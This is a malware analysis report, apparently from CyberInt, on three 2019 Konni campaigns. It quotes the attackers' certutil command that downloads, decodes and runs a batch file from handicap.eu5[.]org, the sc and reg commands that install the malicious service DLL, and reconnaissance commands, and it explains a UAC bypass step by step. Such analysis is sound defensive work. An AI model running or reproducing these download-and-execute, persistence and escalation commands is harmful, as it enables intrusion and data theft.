CyberInt Research Team observed 3 distinct campaigns throughout\n\n2019: starting from January to late September.\n\nKonni Infection chain consists of multiple stages and utilizes living-off-the-land binaries in its operation from the\n\nuse of certutil.exe to download additional files and decode their content to sc.exe and reg.exe for persistence.\n\nThese campaigns leverage similar C2 infrastructure for the delivery and a specific free FTP service used for\n\nexfiltration the stolen data from the affected targets. Additionally, the macro-armed lure documents used to\n\ndeliver and install the Konni payloads have similarities across all 3 campaigns.\n\nKonni is modular malware that collects reconnaissance data on the target machine prior to sending further\n\nmodules. We were unable to find additional operations related to the Konni malware family that might reveals\n\nfurther capabilities and malware types used by the group associated with Konni activity.\n\nDuring our analysis we found overlapping between the Konni infection chain, tools and technique used by the\n\n[Syscon backdoor [1]](https://blog.trendmicro.com/trendlabs-security-intelligence/syscon-backdoor-uses-ftp-as-a-cc-channel/) using a service called COMSysApp to load the payload as a service DLL as a mean to achieve\n\npersistence on the victim machine. Although we observed similarities between Konni and Syscon, at this time\n\nwe can’t say with full certainty that the same threat actor is behind both operations.\n\n\n-----\n\n#### Campaign Timeline \n\n Execution flow\n\n\nFigure 2 Typical Konni execution flow\n\n\n-----\n\n### Konni Multi-Stage Operation \n\n#### Stage 1 – Initial Execution \n\nIn mid-July 2019 CyberInt research team observed a campaign delivering the Konni malware.\n\nThe threat actor behind the campaign leveraged a malicious macro-armed Microsoft Word document titled: “О\n\nситуации на Корейском полуострове и перспективах диалога между США и КНДР” (translated to: About\n\nthe situation on the Korean Peninsula and the prospect of a dialogue between the United States and the\n\nDPRK). Unlike the previously observed campaign, the August campaign potentially targeting Russian language\n\nspeakers with an interest in Korean geo-political situation, the lure document used in this campaign is written\n\nCyrillic and contains content related to North Korean American foreign affairs.\n\nFigure 3 Decoy document for 4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726\n\nWhen analyzing the document, we see that the internal codepage of the lure document is 949 - ANSI/OEM\n\nKorean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard\n\nlayout. This is an indication that the author is a Korean native speaker.\n\n\n-----\n\nFigure 4 Document Properties. Codepage 949 is windows Korean (Unified Hangul Code)\n\nThe lure document contains VBA macro code with the following capabilities:\n\n⇒ Changes the font color from light grey to black – to trick the victim to enable content.\n\n⇒ Checks if windows is a 32 or 64 bit version.\n\n⇒ Constructs and executes the command-line to download additional files.\n\nFigure 5 Macro code for 4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726\n\n\n-----\n\nThe document contains 3 hidden textboxes. Each has a hexadecimal string constructed to a command line\n\nexecuted once the document is opened by the victim.\n\n|TextBox #|Hex String|ASCII String|\n|---|---|---|\n|TextBox1|5C7379736E61746976655C636D642E657865202F71202 F6320|\\sysnative\\cmd.exe /q /c|\n|TextBox2|5C73797374656D33325C636D642E657865202F71202F6 320|\\system32\\cmd.exe /q /c|\n|TextBox3|636F7079202F79202577696E646972255C73797374656 D33325C636572747574696C2E657865202574656D702 55C6D782E657865202626206364202F64202574656D7 025202626206D78202D75726C6361636865202D73706 C6974202D6620687474703A2F2F68616E64696361702 E6575352E6F72672F312E747874202626206D78202D64 65636F6465202D6620312E74787420312E62617420262 62064656C202F66202F7120312E74787420262620312E 626174|copy /y %windir%\\system32\\certutil.e xe %temp%\\mx.exe && cd /d %temp% && mx -urlcache - split -f http://handicap.eu5[.]org/1.txt && mx -decode -f 1.txt 1.bat && del /f /q 1.txt && 1.bat|\n\n\nFull Command Line example:\n\n\nc:\\windows\\system32\\cmd.exe /q /c copy /y %windir%\\system32\\certutil.exe %temp%\\mx.exe && cd /d %temp% &&\n\n\n[mx -urlcache -split -f http://handicap[.]eu5.org/1.txt && mx -decode -f 1.txt 1.bat && del /f /q 1.txt && 1.bat](http://handicap%5B.%5Deu5.org/1.txt)\n\n**Certutil is a living-off the land command line utility that can be used to obtain certificate authority information**\n\n\nand configure certificate services. Threat actors usually utilize certutil to download remote files from a given\n\n\nURL. It also incorporates a built-in function to decode base64-encoded files.\n\n\nCMD silently copies certutil.exe into temp directory and rename it to “mx.exe” in an attempt to evade\n\n\ndetection and then downloads 1.txt from from a remote resource: [http://handicap.eu5[.]org. The text file](http://handicap.eu5%5B.%5Dorg./)\n\n\ncontains a base64 encoded string that is decoded by certutil and saved as 1.bat.\n\n\nThe threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.\n\n\nFigure 6 Konni Initial Execution\n\n\n-----\n\n#### Stage 2 – Privilege Escalation \n\nThe batch script acts as a second stage downloader and downloads two additional files, depending on the\n\nsystem architecture. Certutil is executed to download a txt file and decode its content. Decoding each base64\n\nstring (32-bit or 64-bit version) results in a cabinet file – setup.cab\n\nFigure 7 1.bat: downloads next stager\n\nThe content of the cabinet file is then extracted into %temp% folder, and setup.cab file is deleted from the\n\nsystem.\n\nFigure 8 setup.cab files\n\n⇒ **Install.bat – acts as installer to ensure persistence and execute mshlpsrvc.dll.**\n\n⇒ **mshlpweb.dll – acts as loader; responsible to elevate privileges.**\n\n⇒ **mshlpsrvc.dll – final payload; responsible for data exfiltration.**\n\n⇒ **mshlpsrvc.ini – configuration file; contains URL used by mshlpsrvc.dll**\n\n\n-----\n\nBoth dropped DLL files are unsinged and packed with UPX packer:\n\nFigure 9 UPX strings indicate file is packed\n\nTo check level of permissions, the threat actor uses net.exe. if the current user has high privileges, install.bat is\n\nexecuted directly. Otherwise, mshlpweb.dll is executed using rundll32.exe.\n\nFigure 10 1.bat: Checks for user's permission\n\nmshlpweb.dll is a loader that uses a known token impersonation technique to elevate permissions and execute\n\ninstall.bat with high privileges. To gain higher privileges mshlpweb.dll execute the Windows Update Standalone\n\nInstaller, wusa.exe. This process runs as a high-integrity process by default, since its set to auto-elevate within\n\nits manifest.\n\n\n-----\n\nFigure 11 wusa.exe manifest, autoElevate set to true\n\nmshlpweb.dll contains an access token impersonation routine that duplicates the token of the high integrity\n\ninstance of wusa.exe, and uses it to create a new cmd.exe process running under the security context of the\n\n[impersonated user[2], which in turn execute the installer - install.bat.](https://attack.mitre.org/techniques/T1134/)\n\n\n_Figure 12 wusa.exe runs with high integrity_\n\n\n-----\n\n##### Token Impersonation Routine \n\nmshlpweb.dll utilize a set of standard windows api calls to duplicate the token of wusa.exe and use it to spawn\n\nhigh integrity instance of cmd.exe. Higher privileges are needed to execute the installer, install.bat. The\n\ntechnique used by the threat actor is a full fileless UAC bypass named “Cavalry” that was leaked back in March\n\n2017 to WikiLeaks as part of “Vault 7\", a series of leaks on the US CIA that included sophisticated privilege\n\n[escalation techniques used by several actors in the wild since the leakage [3]. This technique also bypasses UAC](https://wikileaks.org/ciav7p1/)\n\nwith the “AlwaysNotify” settings.\n\nTechnique flow:\n\n⇒ wusa.exe is executed in hidden window using ShellExecuteExW;\n\n⇒ Handle to the access token associated with wusa.exe is created.\n\n⇒ The token object of wusa.exe is duplicated using DuplicateTokenEx. The threat actor pass\n\n“Token_all_access” as desired access, which combines all possible access rights for a token and creates a\n\nnew impersonation token.\n\n⇒ A new SID with medium privileges is created and set with NtSetInformationToken to the new duplicated\n\ntoken to lower its mandatory integrity level\n\n\n-----\n\n⇒ A restricted token is then created and duplicated using NtFilterToken and DuplicateTokenEx respectively.\n\n⇒ The new duplicated token is passed to ImpersonateLoggedOnUser.\n\n⇒ An elevated cmd instance is spawned using CreateProcessWithLogonW function. The credentials passed\n\nas arguments to the function (Username: aaa, Domain: bbb, Password: ccc) are identical to the\n\n[credentials specified in the UAC bypass implementation by FuzzySecurity, UAC-TokenMagic [4]](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1)\n\n\n-----\n\n[James Forshaw’s blog[6] clearly outlines in detail how to bypass UAC using the technique above.](https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-2.html)\n\n\n-----\n\nFigure 13 Konni 2[nd] stage and privilege escalation flow\n\n\n-----\n\n#### Stage 3 – Persistence \n\nWhen the installer is executed, it first stops COMSysApp, a service that manages the configuration and\n\ntracking of Component Object Model (COM)-based components, using sc.exe utility.\n\n⇒ COMSysApp service is first configured to autostart and the binpath of the service is set to svchost.exe:\n\nsc config COMSysApp type= interact type= own start= auto error= normal binpath=\n\n\"%windir%\\System32\\svchost.exe -k COMSysApp\"\n\nThis is a commonly used technique for persistence, as it will automatically start the service after a\n\nsuccessful login.\n\n⇒ COMSysApp service is added under the “SvcHost” key as a preliminary step to its execution in the\n\ncontext of svchost.exe:\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ\n\n/d \"COMSysApp\"\n\n⇒ The malicious DLL is added as a service DLL of COMSysApp:\n\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ\n\n/d \"%windir%\\System32\\mshlpsrvc.dll\"\n\n⇒ COMSysApp service is restarted\n\nFigure 14 Install.bat: Persistence & Execution of mshlpsrvc.dll\n\nOnce COMSysApp service is restarted the malware is loaded in memory, and the batch file is removed from the\n\ninfected system.\n\nThe final payload (mshlpsrvc.dll), and its configuration file (mshlpsrvc.ini) are both copied into the system32\n\ndirectory from the temp directory and then deleted.\n\n\n-----\n\nFigure 15 Install.bat: files copied to System32 directory\n\nFigure 16 mshlpsrvc.dll Execution and Persistence flow\n\n\n-----\n\n#### Stage 4 – Data Reconnaissance and Exfiltration \n\nAfter ComSysApp service is restarted, a new instance of Svchost.exe is spawned and loads mshlpsrvc.dll.\n\nmshlpsrvc.ini is a configuration file that delivered together with the final payload mshlpsrv.dll in earlier stage.\n\nThis file contains a Base64-encoded string with a custom key, the file is read by and decoded by mshlpsrvc.dll\n\nto perform an outbound connection and download handicap[.]eu5[.]org/4.txt\n\nFigure 17 The Custom Base64 key used to decode mshlpsrvc.ini content\n\n\n-----\n\n##### Data Reconnaissance \n\nPrior to execution of any recon command to gather information from the target machine, the default codepage\n\nof the CMD console is changed to “65001” (utf-8)\n\ncmd /c REG ADD HKCU\\Console /v CodePage /t REG_DWORD /d 65001 /f\n\nThe following information is gathered from the affected machine and sent back to the control server:\n\n⇒ System info using: cmd /c systeminfo >%temp%\\temp.ini\n\n⇒ List of running process using: cmd /c tasklist >%temp%\\temp.ini\n\n⇒ The temp.ini file is then compressed into a cabinet file and saved to C:\\Windows\\TEMP\n\ncmd /c makecab \"C:\\Windows\\TEMP\\temp.ini\" \"C:\\Windows\\TEMP\\temp.cab\"\n\nThe downloaded file, 4.txt, contains a base64 encoded string with the same custom key. Following decoding,\n\nthe file content appears to be the FTP credentials for the FTP service that acts as the command & control\n\nserver for this attack. We’ve observed similar past campaigns where other free FTP services were used as the\n\n[C2 for Konni and Syscon variants, staring from October 2017. [5]](https://blog.trendmicro.com/trendlabs-security-intelligence/syscon-backdoor-uses-ftp-as-a-cc-channel/)\n\nFigure 18 4.txt: FTP credentials for C2 server\n\n\n-----\n\n##### Exfiltration\n\nThe data is exfiltrated using the following:\n\n  - The temp.cab is base64 encoded with the same custom key used earlier.\n\n  - Encoded temp.cab is copied to a post.txt under the directory C:\\Windows\\TEMP\n\n  - files uploaded to the control server using “stor” command.\n\n_Figure 19 FTP Session – login to the C2 FTP server and data exfiltration_\n\nFigure 20 Data Reconnaissance and Exfiltration flow\n\n\n_Figure 19 FTP Session – login to the C2 FTP server and data exfiltration_\n\n\n-----\n\n### Konni Campaigns-2019\n\nCyberInt Research Team observed 3 additional outbursts throughout the year: 2 similar samples observed on\n\nJanuary 2019, and another one on September 2019.\n\nFigure 21 Konni Outbursts 2019\n\n#### Hash Comparison \n\nImphash (for “import hash”) is a unique hash value assign to PE files based on the import table of the file. The\n\nhash is calculated by the library and API function names and their order within the executable. This is an\n\nefficient way of pivoting on malicious executables that share a similar payload are most likely created by the\n\nsame group.\n\n**DLL Name** **SHA-256** **Imphash** **Compile**\n\n**Time**\n\n**compvgk.dll** 6256ba2b89c78877328cc70d45db980310a5 2818b3a61dc203e3e75c9312d428b24a 2019-01-21\n\n1545a83d1d922d64048b57d6c057 03:01:58\n\n**comsyslib2.dll** 274e706809a1c0363f78363d0c6a7d256be5b 2818b3a61dc203e3e75c9312d428b24a 2019-01-30\n\ne11039de14f617265e01d550a98 06:06:34\n\n**mshlpsrvc.dll** ceb8093507911939a17c6c7b39475f5d4db70 419ec273a5550a29fd3ce9d1b09bd155 2019-07-12\n\na9ed3b85ef34ff5e6372b20a73e 09:08:33\n\n**mshlpsrvc.dll** 7d2b1af486610a45f78a573af9a9ad00414680 22453bac1da954a5399ae66ee20e9b9d 2019-07-12\n\nff8e958cfb5437a1b140acb60c 09:09:52\n\n**xclientsvc.dll** 7f6984fa9d0bbc1bd6ab531f0a8c2f4beb15d 22453bac1da954a5399ae66ee20e9b9d 2019-09-05\n\ne30f2b20054d3980395d77665af 07:05:43\n\n**xclientsvc.dll** 290c942da70c68d28a387775fbb7e6cab674 419ec273a5550a29fd3ce9d1b09bd155 2019-09-05\n\n9547d278cb755b4999e0fe61a09f 07:06:27\n\nThe compiler's linker builds the Import Address Table (IAT) based on the specific order of functions within the\n\nsource file, same Imphash value indicates that the PE IAT table includes the same functions and in the same\n\norder. This is a strong evidence that ties together different payloads from different campaigns to the same\n\nthreat actor.\n\n|DLL Name|SHA-256|Imphash|Compile Time|\n|---|---|---|---|\n|compvgk.dll|6256ba2b89c78877328cc70d45db980310a5 1545a83d1d922d64048b57d6c057|2818b3a61dc203e3e75c9312d428b24a|2019-01-21 03:01:58|\n|comsyslib2.dll|274e706809a1c0363f78363d0c6a7d256be5b e11039de14f617265e01d550a98|2818b3a61dc203e3e75c9312d428b24a|2019-01-30 06:06:34|\n|mshlpsrvc.dll|ceb8093507911939a17c6c7b39475f5d4db70 a9ed3b85ef34ff5e6372b20a73e|419ec273a5550a29fd3ce9d1b09bd155|2019-07-12 09:08:33|\n|mshlpsrvc.dll|7d2b1af486610a45f78a573af9a9ad00414680 ff8e958cfb5437a1b140acb60c|22453bac1da954a5399ae66ee20e9b9d|2019-07-12 09:09:52|\n|xclientsvc.dll|7f6984fa9d0bbc1bd6ab531f0a8c2f4beb15d e30f2b20054d3980395d77665af|22453bac1da954a5399ae66ee20e9b9d|2019-09-05 07:05:43|\n|xclientsvc.dll|290c942da70c68d28a387775fbb7e6cab674 9547d278cb755b4999e0fe61a09f|419ec273a5550a29fd3ce9d1b09bd155|2019-09-05 07:06:27|\n\n\n-----\n\n#### Doc Properties Comparison \n\nAll lure documents associated with Konni activities are written in Cyrillic, and potentially target political\n\norganizations and politically motivated victims in Russia. Notwithstanding, we found that all 3 documents files’\n\ninternal codepage is set to 949 - ANSI/OEM Korean (Unified Hangul Code).\n\n#### Macro Comparison \n\nThe lure document is armed with a VBA macro that essentially comprise the command line to be executed. The\n\nfinal command line that is composed by the macro is identical across all 3 campaigns expect of the C2 URL,\n\nwhere the next stager is downloaded from. In our example from the July campaign the final command line is:\n\nc:\\windows\\system32\\cmd.exe /q /c copy /y %windir%\\system32\\certutil.exe %temp%\\mx.exe && cd /d %temp% &&\n\nmx -urlcache -split -f http://handicap.eu5[.]org/1.txt && mx -decode -f 1.txt 1.bat && del /f /q 1.txt && 1.bat\n\nBelow you can see the evolution and changes made in the macro code level throughout the Konni attacks; one\n\nnotable change is the switch to hidden text boxes within the document that contain the hex representation of\n\nthe commands instead using it directly in the macro.\n\n\n-----\n\n#### Decoding Routine \n\nKonni malware family use a custom base64 key to encode the content of several files in the exfiltration phase.\n\nWe observed the same flow of data reconnaissance and exfiltration across all campaigns:\n\nFigure 22 Typical Konni Data Reconnaissance and Exfiltration\n\n\n-----\n\nThe decoding routine is identical in all Konni samples we have analyzed which indicate a code reuse by the\n\nthreat actor.\n\nFigure 23 Decoding Routine\n\n\n-----\n\n### MITRE ATT&CK Techniques \n\n|Execution|Persistence|Privilege Escalation|Defense Evasion|Credential Access|Discovery|Collection|Exfiltration|C&C|\n|---|---|---|---|---|---|---|---|---|\n|Command-Line Interface|Modify Existing Service|Access Token Manipulation|Access Token Manipulation||Process Discovery||Exfiltration Over Alternative Protocol|Data Encoding|\n|Execution through Module Load|New Service|New Service|Bypass User Account Control||System Information Discovery||||\n|Rundll32|||Deobfuscate/Decode Files or Information||||||\n||||Modify Registry||||||\n||||Rundll32||||||\n\n\n-----\n\n### IOCs\n\nLure Documents\n\n8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd\n\n4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726\n\ned63e84985e1af9c4764e6b6ca513ec1c16840fb2534b86f95e31801468be67a\n\nKonni Loader\n\n6a22db7df237c085855deb48686217173dc2664f4b927ebe238d4442b68a2fd3\n\n2ab1b28bae24217e8b6dd0cd30bb7258fa34c0d7337ecfea55e4310d08aeb1e6\n\nKonni final payload DLL\n\ne94fa697d8661d79260edf17c0a519fae4b2a64037aa79b29d6631205995fdad\n\n6256ba2b89c78877328cc70d45db980310a51545a83d1d922d64048b57d6c057\n\n52ba17b90244a46e0ef2a653452b26bcb94f0a03b999c343301fef4e3c1ec5d2\n\n7d2b1af486610a45f78a573af9a9ad00414680ff8e958cfb5437a1b140acb60c\n\nceb8093507911939a17c6c7b39475f5d4db70a9ed3b85ef34ff5e6372b20a73e\n\n8795b2756efa32d5101a8d38ea27fca9c8c7ed1d54da98f0520f72706d1c5105\n\n7f6984fa9d0bbc1bd6ab531f0a8c2f4beb15de30f2b20054d3980395d77665af\n\n290c942da70c68d28a387775fbb7e6cab6749547d278cb755b4999e0fe61a09f\n\n274e706809a1c0363f78363d0c6a7d256be5be11039de14f617265e01d550a98\n\nIP Addresses\n\n69.197.143.12\n\n185.27.134.11\n\n88.99.13.69\n\n162.253.155.226\n\nDomains\n\nclean.1apps[.]com\n\nhandicap. eu5[.]org\n\npanda2019.eu5[.]org\n\nftpupload[.]net\n\n\n-----\n\n-----",
